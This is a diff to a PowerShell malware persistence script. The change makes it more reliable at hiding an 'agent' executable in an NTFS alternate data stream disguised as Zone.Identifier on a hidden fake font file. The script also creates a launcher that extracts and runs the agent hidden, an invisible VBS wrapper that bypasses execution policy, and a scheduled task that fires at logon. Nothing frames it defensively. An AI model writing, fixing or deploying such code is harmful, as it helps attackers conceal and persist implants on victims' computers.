@@ -4,6 +4,7 @@ $WarningPreference = 'SilentlyContinue'
 $VerbosePreference = 'SilentlyContinue'
 $DebugPreference = 'SilentlyContinue'
 $InformationPreference = 'SilentlyContinue'
+
 param($args)
 
 $agentPath = $env:AgentPath
@@ -21,21 +22,29 @@ if (-not (Test-Path $fontDir)) {
 }
 
 $fontFile = "$fontDir\seguibl.ttf"
-if (-not (Test-Path $fontFile)) {
-    $fakeFontContent = "TTF fake font file - do not delete"
-    Set-Content -Path $fontFile -Value $fakeFontContent -Encoding ASCII -Force
-    attrib +h $fontFile
-    Write-Output "[+] Created fake font file: $fontFile"
-} else {
-    Write-Output "[+] Using existing font file: $fontFile"
+
+# Remove any existing font file to ensure we start clean (avoid ADS write issues)
+if (Test-Path $fontFile) {
+    Remove-Item $fontFile -Force -ErrorAction SilentlyContinue
+    Write-Output "[+] Removed existing font file"
 }
 
-# --- 2. Hide agent in ADS ---
+# Create an empty file first
+New-Item -ItemType File -Path $fontFile -Force | Out-Null
+attrib +h $fontFile
+Write-Output "[+] Created fresh font file: $fontFile"
+
+# --- 2. Write agent to ADS using .NET method (reliable) ---
 $streamName = "Zone.Identifier"
-Write-Output "[+] Hiding agent in ADS: $fontFile`:$streamName"
 $agentBytes = [System.IO.File]::ReadAllBytes($agentPath)
-Set-Content -Path $fontFile -Stream $streamName -Value $agentBytes -Encoding Byte
-$hiddenPath = "$fontFile`:$streamName"
+try {
+    # WriteAllBytes to the stream path: file:stream
+    [System.IO.File]::WriteAllBytes("$fontFile`:$streamName", $agentBytes)
+    Write-Output "[+] Agent embedded into ADS: $fontFile`:$streamName"
+} catch {
+    Write-Output "[-] Failed to write ADS: $_"
+    exit
+}
 
 # --- 3. Create launcher script (run.ps1) with cleanup ---
 $launcherPath = "$fontDir\run.ps1"
@@ -49,7 +58,7 @@ $launcherContent = @"
 if (Test-Path `$tempAgent) { Remove-Item `$tempAgent -Force -ErrorAction SilentlyContinue }
 
 # Extract agent from ADS
-`$bytes = Get-Content -Path `$fontFile -Stream `$streamName -Encoding Byte -Raw -ErrorAction SilentlyContinue
+`$bytes = [System.IO.File]::ReadAllBytes("`$fontFile`:`$streamName")
 if (`$bytes) {
     [System.IO.File]::WriteAllBytes(`$tempAgent, `$bytes)
     Start-Process -WindowStyle Hidden `$tempAgent
@@ -61,7 +70,6 @@ Write-Output "[+] Created launcher with cleanup: $launcherPath"
 
 # --- 4. Create VBS launcher (completely invisible) ---
 $vbsPath = "$fontDir\run.vbs"
-# Correct VBS syntax: double quotes inside the string are escaped by doubling them.
 $vbsContent = @"
 Set WshShell = CreateObject("WScript.Shell")
 WshShell.Run "powershell.exe -NoProfile -ExecutionPolicy Bypass -File ""$launcherPath""", 0, False
@@ -121,6 +129,6 @@ if (-not $taskCreated) {
     Write-Output "✅ PERSISTENCE COMPLETE"
     Write-Output "Script location: $launcherPath"
     Write-Output "VBS launcher: $vbsPath"
-    Write-Output "Agent hidden in: $hiddenPath"
+    Write-Output "Agent hidden in: $fontFile`:$streamName"
     Write-Output "The scheduled task will run the VBS (invisible) on next logon."
 }
